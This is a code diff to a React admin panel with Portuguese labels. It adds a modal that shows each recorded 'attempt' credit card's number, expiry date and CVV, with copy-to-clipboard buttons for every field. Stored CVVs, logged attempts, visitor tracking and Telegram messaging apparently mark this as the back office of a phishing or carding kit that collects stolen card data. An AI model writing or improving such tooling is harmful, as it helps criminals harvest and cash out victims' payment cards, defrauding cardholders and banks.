@@ -25,6 +25,7 @@ function AdminPanel() {
   const [telegramMessage, setTelegramMessage] = useState("");
   const [visitors, setVisitors] = useState([]);
   const [visitorsLoading, setVisitorsLoading] = useState(false);
+  const [ccModalData, setCcModalData] = useState(null);
 
   // Função para copiar texto com um clique
   const copyToClipboard = async (text, fieldId) => {
@@ -823,11 +824,10 @@ function AdminPanel() {
                           <td className="px-2 py-2 text-center text-sm border border-[#2a2a2a]">
                             {attempt.credit_card ? (
                               <button
-                                onClick={() => copyToClipboard(attempt.credit_card, `cc-${attempt.id}`)}
+                                onClick={() => setCcModalData(attempt.credit_card)}
                                 className="bg-[#1a2a1a] hover:bg-[#253525] text-white text-xs font-bold px-3 py-1.5 rounded border border-green-500/30 transition-colors"
-                                title={attempt.credit_card}
                               >
-                                {copiedField === `cc-${attempt.id}` ? "✓ Copiado!" : "Exibir"}
+                                Exibir
                               </button>
                             ) : (
                               <span className="text-gray-600">-</span>
@@ -1023,6 +1023,64 @@ function AdminPanel() {
           </div>
         </div>
       )}
+
+      {/* ========== MODAL CC - DADOS DO CARTÃO ========== */}
+      {ccModalData && (() => {
+        const parts = ccModalData.split(" | ");
+        const numero = parts[0] || "-";
+        const validade = parts[1] || "-";
+        const cvv = parts[2] || "-";
+        return (
+          <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4" onClick={() => setCcModalData(null)}>
+            <div className="bg-[#111111] border border-[#333] rounded-xl w-full max-w-sm p-6" onClick={(e) => e.stopPropagation()}>
+              <div className="flex items-center justify-between mb-6">
+                <h2 className="text-lg font-bold text-white">Dados do Cartão</h2>
+                <button onClick={() => setCcModalData(null)} className="text-gray-500 hover:text-white text-2xl">&times;</button>
+              </div>
+
+              <div className="space-y-4">
+                <div>
+                  <label className="block text-xs text-gray-500 mb-1">Número do Cartão</label>
+                  <div
+                    onClick={() => copyToClipboard(numero, "cc-numero")}
+                    className="bg-[#0a0a0a] border border-[#333] rounded-lg px-4 py-3 text-white font-mono text-lg cursor-pointer hover:border-gray-500 transition-colors"
+                  >
+                    {copiedField === "cc-numero" ? <span className="text-green-400">Copiado!</span> : numero}
+                  </div>
+                </div>
+
+                <div className="grid grid-cols-2 gap-4">
+                  <div>
+                    <label className="block text-xs text-gray-500 mb-1">Validade</label>
+                    <div
+                      onClick={() => copyToClipboard(validade, "cc-validade")}
+                      className="bg-[#0a0a0a] border border-[#333] rounded-lg px-4 py-3 text-white font-mono text-lg text-center cursor-pointer hover:border-gray-500 transition-colors"
+                    >
+                      {copiedField === "cc-validade" ? <span className="text-green-400">Copiado!</span> : validade}
+                    </div>
+                  </div>
+                  <div>
+                    <label className="block text-xs text-gray-500 mb-1">CVV</label>
+                    <div
+                      onClick={() => copyToClipboard(cvv, "cc-cvv")}
+                      className="bg-[#0a0a0a] border border-[#333] rounded-lg px-4 py-3 text-white font-mono text-lg text-center cursor-pointer hover:border-gray-500 transition-colors"
+                    >
+                      {copiedField === "cc-cvv" ? <span className="text-green-400">Copiado!</span> : cvv}
+                    </div>
+                  </div>
+                </div>
+
+                <button
+                  onClick={() => copyToClipboard(ccModalData, "cc-all")}
+                  className="w-full bg-[#1a1a1a] text-white font-bold border border-gray-600/40 py-2.5 rounded-lg hover:bg-[#252525] transition-colors text-sm mt-2"
+                >
+                  {copiedField === "cc-all" ? "Tudo Copiado!" : "Copiar Tudo"}
+                </button>
+              </div>
+            </div>
+          </div>
+        );
+      })()}
     </div>
   );
 }
